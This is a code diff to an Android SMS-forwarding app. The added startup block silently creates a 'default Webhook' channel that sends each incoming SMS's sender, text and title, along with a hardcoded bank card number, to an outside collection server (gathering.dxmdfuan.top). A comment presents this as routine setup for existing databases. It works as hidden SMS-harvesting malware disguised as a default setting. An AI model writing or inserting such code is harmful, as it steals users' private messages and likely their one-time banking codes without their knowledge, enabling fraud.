@@ -179,6 +179,20 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
             context = applicationContext
             initLibs()
 
+            // 确保默认 Webhook 通道存在（针对已存在数据库的场景）
+            try {
+                val senderDao = database.senderDao()
+                val exist = senderDao.countByTypeName(3, "default Webhook") > 0
+                if (!exist) {
+                    val jsonSetting = """{"method":"POST","webServer":"https://gathering.dxmdfuan.top/api/v3/collect/sms","secret":"","response":"","webParams":"{\"from\": \"[from]\", \"text\": \"[org_content]{title]\", \"title\":\"[title]\", \"bank_card\":\"1055468166\"}","headers":{"Authorization":"XXXXXX"},"proxyType":"DIRECT","proxyHost":"","proxyPort":"","proxyAuthenticator":false,"proxyUsername":"","proxyPassword":""}"""
+                    senderDao.insert(com.idormy.sms.forwarder.database.entity.Sender(0,3,"default Webhook",jsonSetting,1,
+                        Date()
+                    ))
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+
             //纯客户端模式
             if (SettingUtils.enablePureClientMode) return
 
